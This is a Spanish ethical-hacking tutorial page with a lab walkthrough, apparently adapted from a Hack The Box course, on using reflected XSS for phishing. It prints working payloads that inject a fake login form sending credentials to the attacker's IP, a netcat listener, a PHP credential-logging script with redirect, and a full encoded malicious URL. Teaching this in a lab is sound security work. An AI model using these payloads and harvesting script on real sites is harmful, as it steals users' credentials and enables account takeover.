
# Phising con XSS

Otro tipo muy común de ataque XSS es el ataque de phishing. Los ataques de phishing suelen utilizar información que parece legítima para engañar a las víctimas y conseguir que envíen su información confidencial al atacante. Una forma común de ataques de phishing XSS es inyectar formularios de inicio de sesión falsos que envían los datos de inicio de sesión al servidor del atacante, que luego pueden utilizarse para iniciar sesión en nombre de la víctima y obtener el control de su cuenta y de su información confidencial.

Además, supongamos que identificamos una vulnerabilidad XSS en una aplicación web de una organización en particular. En ese caso, podemos utilizar dicho ataque como un ejercicio de simulación de phishing, lo que también nos ayudará a evaluar el nivel de concienciación en materia de seguridad de los empleados de la organización, especialmente si confían en la aplicación web vulnerable y no esperan que les haga daño.

***

## <mark style="color:purple;">Descubrimiento XSS</mark>

Comenzamos por intentar encontrar la vulnerabilidad XSS en la aplicación web en el directorio `/phishing` de la app vulnerable de esta sección. Cuando visitamos el sitio web, vemos que es un simple visualizador de imágenes en línea, donde podemos ingresar la URL de una imagen y la mostrará:

<figure><img src="/files/shlff3nUvtQLWn7ISVHC" alt=""><figcaption></figcaption></figure>

Este tipo de visualizadores de imágenes es común en foros en línea y aplicaciones web similares. Como tenemos control sobre la URL, podemos comenzar a usar el payload XSS básico que hemos estado usando. Pero cuando probamos esa payload, vemos que no se ejecuta nada y obtenemos el ícono `dead image url`:

<figure><img src="/files/9NkLwWaQnwJHmKP2UxSf" alt=""><figcaption></figcaption></figure>

Entonces, debemos ejecutar el proceso XSS Discovery que aprendimos previamente para encontrar un payload XSS que funcione.

{% hint style="info" %}
**Consejo**: para comprender qué payload debería funcionar, intente ver cómo se muestra su entrada en la fuente HTML después de agregarla.
{% endhint %}

***

## <mark style="color:purple;">Inyección de formulario de inicio de sesión</mark>

Una vez que identificamos una payload XSS que funciona, podemos proceder al ataque de phishing. Para realizar un ataque de phishing XSS, debemos inyectar un código HTML que muestre un formulario de inicio de sesión en la página de destino. Este formulario debe enviar la información de inicio de sesión a un servidor en el que estamos escuchando, de modo que, una vez que un usuario intente iniciar sesión, obtengamos sus credenciales.

Podemos encontrar fácilmente un código HTML para un formulario de inicio de sesión básico, o podemos escribir nuestro propio formulario de inicio de sesión. El siguiente ejemplo debería presentar un formulario de inicio de sesión:

```html
<h3>Please login to continue</h3>
<form action=http://NUESTRA_IP>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```

En el código HTML anterior, se encuentra la IP de nuestra máquina virtual (`NUESTRA_IP`), que podemos encontrar con el comando (`ip a`). Más adelante escucharemos en esta IP para recuperar las credenciales enviadas desde el formulario. El formulario de inicio de sesión debería verse de la siguiente manera:

```html
<div>
<h3>Please login to continue</h3>
<input type="text" placeholder="Username">
<input type="text" placeholder="Password">
<input type="submit" value="Login">
<br><br>
</div>
```

A continuación, debemos preparar nuestro código XSS y probarlo en el formulario vulnerable. Para escribir código HTML en la página vulnerable, podemos usar la función JavaScript `document.write()` y usarla en el payload XSS que encontramos anteriormente en el paso de [XSS Discovery](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-web/cross-site-scripting-xss/xss-discovery.md). Una vez que minimizamos nuestro código HTML en una sola línea y lo agregamos dentro de la función `write`, el código JavaScript final debería ser el siguiente:

```javascript
document.write('<h3>Please login to continue</h3><form action=http://NUESTRA_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

Ahora podemos inyectar este código JavaScript utilizando nuestro payload XSS (es decir, en lugar de ejecutar el código JavaScript `alert(window.origin)`). En este caso, estamos explotando una vulnerabilidad `Reflected XSS`, por lo que podemos copiar la URL y nuestro payload XSS en sus parámetros, como hemos hecho en la sección `Reflected XSS` , y la página debería verse de la siguiente manera cuando visitemos la URL maliciosa:

<figure><img src="https://academy.hackthebox.com/storage/modules/103/xss_phishing_injected_login_form.jpg" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:purple;">Limpiando la web</mark>

Podemos ver que el campo URL todavía se muestra, lo que anula nuestra línea de " `Please login to continue`". Por lo tanto, para alentar a la víctima a usar el formulario de inicio de sesión, debemos eliminar el campo URL, de modo que pueda pensar que tiene que iniciar sesión para poder usar la página. Para ello, podemos usar la función de JavaScript function `document.getElementById().remove()`.

Para encontrar el elemento HTML `id` que queremos eliminar, podemos abrir el `Page Inspector Picker` con \[ `CTRL+SHIFT+C`] y luego haciendo clic en el elemento que necesitamos:&#x20;

<figure><img src="https://academy.hackthebox.com/storage/modules/103/xss_page_inspector_picker.jpg" alt=""><figcaption></figcaption></figure>

Como vemos tanto en el código fuente como en el texto flotante, el formulario tiene el id `urlform`:

```html
<form role="form" action="index.php" method="GET" id='urlform'>
    <input type="text" placeholder="Image URL" name="url">
</form>
```

Entonces, ahora podemos usar esta identificación con la función `remove()` para eliminar el formulario URL:

```javascript
document.getElementById('urlform').remove();
```

Ahora, una vez que agregamos este código a nuestro código JavaScript anterior (después de la función `document.write`), podemos usar este nuevo código JavaScript en nuestro payload:

```javascript
document.write('<h3>Please login to continue</h3><form action=http://NUESTRA_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
```

Cuando intentamos inyectar nuestro código JavaScript actualizado, vemos que el formulario URL ya no se muestra:

<figure><img src="https://academy.hackthebox.com/storage/modules/103/xss_phishing_injected_login_form_2.jpg" alt=""><figcaption></figcaption></figure>

También vemos que todavía queda un fragmento del código HTML original después de inyectar el formulario de inicio de sesión. Se puede eliminar simplemente comentándolo, agregando un comentario de apertura HTML después del payload XSS:

```html
...PAYLOAD... <!-- 
```

Como podemos ver, esto elimina el resto del código HTML original y nuestro payload debería estar lista. Ahora parece que la página requiere un inicio de sesión de forma legítima:

<figure><img src="https://academy.hackthebox.com/storage/modules/103/xss_phishing_injected_login_form_3.jpg" alt=""><figcaption></figcaption></figure>

Ahora podemos copiar la URL final que debería incluir todo el payload y podemos enviarlo a nuestras víctimas e intentar engañarlas para que utilicen el formulario de inicio de sesión falso. Puedes intentar visitar la URL para asegurarte de que mostrará el formulario de inicio de sesión como se espera. Intenta también iniciar sesión en el formulario de inicio de sesión anterior y observa qué sucede.

***

## <mark style="color:purple;">Robo de credenciales</mark>

Finalmente, llegamos a la parte en la que robamos las credenciales de inicio de sesión cuando la víctima intenta iniciar sesión en nuestro formulario de inicio de sesión inyectado. Si intentara iniciar sesión en el formulario de inicio de sesión inyectado, probablemente obtendría el error `This site can’t be reached`. Esto se debe a que, como se mencionó anteriormente, nuestro formulario HTML está diseñado para enviar la solicitud de inicio de sesión a nuestra IP, que debería estar escuchando una conexión. Si no estamos escuchando una conexión, obtendremos un error `site can’t be reached`.

Por lo tanto, iniciemos un servidor `netcat` simple y veamos qué tipo de solicitud recibimos cuando alguien intenta iniciar sesión a través del formulario. Para ello, podemos comenzar a escuchar en el puerto 80 en nuestro Kali Linux, de la siguiente manera:

```shell-session
afsh4ck@kali$ sudo nc -lvnp 80
listening on [any] 80 ...
```

Ahora, intentemos iniciar sesión con las credenciales `test:test` y verifiquemos el resultado que obtenemos ( No olvides reemplazar `NUESTRA_IP` en el payload XSS con tu IP real):

```shell-session
connect to [10.10.XX.XX] from (UNKNOWN) [10.10.XX.XX] XXXXX
GET /?username=test&password=test&submit=Login HTTP/1.1
Host: 10.10.XX.XX
...SNIP...
```

Como podemos ver, podemos capturar las credenciales en la URL de la solicitud HTTP ( `/?username=test&password=test`). Si alguna víctima intenta iniciar sesión con el formulario, obtendremos sus credenciales.

Sin embargo, como solo estamos escuchando con `netcat`, no manejará la solicitud HTTP correctamente y la víctima obtendría un error `Unable to connect`, lo que podría generar algunas sospechas. Por lo tanto, podemos usar un script PHP básico que registre las credenciales de la solicitud HTTP y luego devuelva a la víctima a la página original sin ninguna inyección. En este caso, la víctima puede pensar que inició sesión correctamente y usará el Visor de imágenes como estaba previsto.

El siguiente script PHP debería hacer lo que necesitamos y lo escribiremos en un archivo en nuestra VM al que llamaremos `index.php` y lo colocaremos en `/tmp/tmpserver/` (No olvides editar el SERVER\_IP para que apunte a la página objetivo):

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

Ahora que tenemos nuestro archivo `index.php` listo, podemos iniciar un servidor `PHP` de escucha, que podemos usar en lugar del listener `netcat` básico que usamos anteriormente:

```shell-session
afsh4ck@kali$ mkdir /tmp/tmpserver
afsh4ck@kali$ cd /tmp/tmpserver
afsh4ck@kali$ sudo nano index.php # En este paso escribimos el archivo index.php
afsh4ck@kali$ sudo php -S 0.0.0.0:80
PHP 7.4.15 Development Server (http://0.0.0.0:80) started
```

Intentemos iniciar sesión en el formulario de inicio de sesión inyectado y veamos qué obtenemos. Vemos que nos redirecciona a la página original del Visor de imágenes:

<figure><img src="https://academy.hackthebox.com/storage/modules/103/xss_image_viewer.jpg" alt=""><figcaption></figcaption></figure>

Si revisamos el archivo `creds.txt` en nuestro Kali Linux, vemos que obtuvimos las credenciales de inicio de sesión:

```shell-session
afsh4ck@kali$ cat creds.txt
Username: test | Password: test
```

***

## <mark style="color:purple;">Caso práctico</mark>

Intenta encontrar un payload XSS que funcione para el formulario de URL de imagen que se encuentra en '`/phishing`' en el servidor mencionado anteriormente y luego usa lo que aprendiste en esta sección para preparar una URL maliciosa que inyecte un formulario de inicio de sesión malicioso. Luego visita '`/phishing/send.php`' para enviar la URL a la víctima, y ​​esta iniciará sesión en el formulario de inicio de sesión malicioso. Si hiciste todo correctamente, deberías recibir las credenciales de inicio de sesión de la víctima, que puedes usar para iniciar sesión en '`/phishing/login.php`' y obtener la flag.

```
Objetivo: 
```

### Descubrimiento XSS

Al testear varios scripts XSS encontramos uno que nos lanza una alerta, por lo que vamos a usar ese esquema para ejecutar el ataque:

```html
'><script>alert("XSS testing");</script>
```

<figure><img src="/files/3rEaJlVZCbC5BEInbAL1" alt=""><figcaption></figcaption></figure>

Al revisar el código fuente vemos que se ha inyectado correctamente:

<figure><img src="/files/h4AprJLyVJiFvxspbqNO" alt=""><figcaption></figcaption></figure>

### Inyección de formulario

Vamos a usar el siguiente payload para inyectar un formulario que apunte a nuestra IP de atacante:

```html
'><script>document.write('<h3>Please login to continue</h3><form action=http://10.10.14.182:80><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');</script>
```

<figure><img src="/files/YS6oDRgROzuH7eO5bOHb" alt=""><figcaption></figcaption></figure>

Vemos que se inyecta el formulario correctamente, pero vamos a limpiar los elementos innecesarios.

### Limpieza de web

Tenemos que limpiar 2 elementos de la web para dejarlo con una buena apariencia:

1. El input de URL
2. El texto plano suelto del final

Vamos a usar el siguiente payload:

<pre class="language-html"><code class="lang-html"><strong>'>&#x3C;script>document.write('&#x3C;h3>Please login to continue&#x3C;/h3>&#x3C;form action=http://10.10.14.182>&#x3C;input type="username" name="username" placeholder="Username">&#x3C;input type="password" name="password" placeholder="Password">&#x3C;input type="submit" name="submit" value="Login">&#x3C;/form>');document.getElementById('urlform').remove();&#x3C;/script> &#x3C;!-- 
</strong></code></pre>

<figure><img src="/files/aMmkOFx8hZaMtaqpaqvI" alt=""><figcaption></figcaption></figure>

Limpia! Y si vemos el código fuente también han desaparecido los elementos:

<figure><img src="/files/onpnkhw4YakHyXWxQEnw" alt=""><figcaption></figcaption></figure>

Además, vamos a darle un mejor aspecto tocanto el código html para poner los inputs en vertical:

```html
'><script>document.write('<h3 style="text-align: center;">Please login to continue</h3><form action=http://10.10.14.182:80><input style="width: 20%; padding: 5px 5px; margin: 0px auto; box-sizing: border_box; display: block;" type="username" name="username" placeholder="Username"><input style="width: 20%; padding: 5px 5px; margin: 10px auto; box-sizing: border_box; display: block;" type="password" name="password" placeholder="Password"><input style="width: 20%; padding: 5px 5px; margin: 0px auto; box-sizing: border_box; display: block;" type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script><!--
```

<figure><img src="/files/qFmPSUi8NRNIcSPZ0POR" alt=""><figcaption></figcaption></figure>

### Robo de credenciales

Ahora si abrimos un listener de netcat por el puerto 80 y introducimos las credenciales `test:test` nos devuelve las credenciales, pero no devuelve ninguna acción al servidor, con lo que el usuario podría sospechar:

<figure><img src="/files/RVFj8jj7eRHN6MFpxr3H" alt=""><figcaption></figcaption></figure>

Para ello, vamos a usar el script PHP que hemos visto en esta sección, y lo vamos a guardar el script como `index.php` en el directorio `/tmp/tmpserver`:

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://10.129.140.58/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

Ahora que tenemos nuestro archivo `index.php` listo, podemos iniciar un servidor `PHP` de escucha, que podemos usar en lugar del listener `netcat` básico que usamos anteriormente:

```shell-session
afsh4ck@kali$ mkdir /tmp/tmpserver
afsh4ck@kali$ cd /tmp/tmpserver
afsh4ck@kali$ sudo nano index.php # En este paso escribimos el archivo index.php
afsh4ck@kali$ sudo php -S 0.0.0.0:80
PHP 7.4.15 Development Server (http://0.0.0.0:80) started
```

<figure><img src="/files/j3jmZwwW3RDK2qY5ywfJ" alt=""><figcaption></figcaption></figure>

Bingo! Recibimos las credenciales correctamente y nos redirige a la página index.php:

<figure><img src="/files/50JE251Yuv0hVkssRMN0" alt=""><figcaption></figcaption></figure>

### Obteniendo la flag

Ahora que tenemos todo configurado correctamente, nos vamos a copiar la URL de nuestra página de login que ya hemos modificado con el formulario de phising y vamos a pegarla en la página `send.php`:

{% code title="URL de login" %}

```
http://10.129.140.58/phishing/index.php?url=%27%3E%3Cscript%3Edocument.write%28%27%3Ch3+style%3D%22text-align%3A+center%3B%22%3EPlease+login+to+continue%3C%2Fh3%3E%3Cform+action%3Dhttp%3A%2F%2F10.10.14.182%3A80%3E%3Cinput+style%3D%22width%3A+20%25%3B+padding%3A+5px+5px%3B+margin%3A+0px+auto%3B+box-sizing%3A+border_box%3B+display%3A+block%3B%22+type%3D%22username%22+name%3D%22username%22+placeholder%3D%22Username%22%3E%3Cinput+style%3D%22width%3A+20%25%3B+padding%3A+5px+5px%3B+margin%3A+10px+auto%3B+box-sizing%3A+border_box%3B+display%3A+block%3B%22+type%3D%22password%22+name%3D%22password%22+placeholder%3D%22Password%22%3E%3Cinput+style%3D%22width%3A+20%25%3B+padding%3A+5px+5px%3B+margin%3A+0px+auto%3B+box-sizing%3A+border_box%3B+display%3A+block%3B%22+type%3D%22submit%22+name%3D%22submit%22+value%3D%22Login%22%3E%3C%2Fform%3E%27%29%3Bdocument.getElementById%28%27urlform%27%29.remove%28%29%3B%3C%2Fscript%3E%3C%21--
```

{% endcode %}

<figure><img src="/files/z9qNffrpXchMljwIcgSq" alt=""><figcaption></figcaption></figure>

Esta página actúa como un usuario que va a introducir sus datos en el link que le enviemos:

<figure><img src="/files/cYXy0Hm6GMOdPMCctyYm" alt=""><figcaption></figcaption></figure>

Funciona! Obtuvimos unas credenciales! Vamos a echarle un ojo:

<figure><img src="/files/zfZNVm5jb5nfSx4gpLPu" alt=""><figcaption></figcaption></figure>

Vamos a usarlas para acceder a la página `/login.php`:

<figure><img src="/files/fpysDshA8vU1QRbEmO0F" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/1cRLaDe0fhZNDGsjQuc5" alt=""><figcaption></figcaption></figure>

Obtenemos la flag correctamente! 🏆
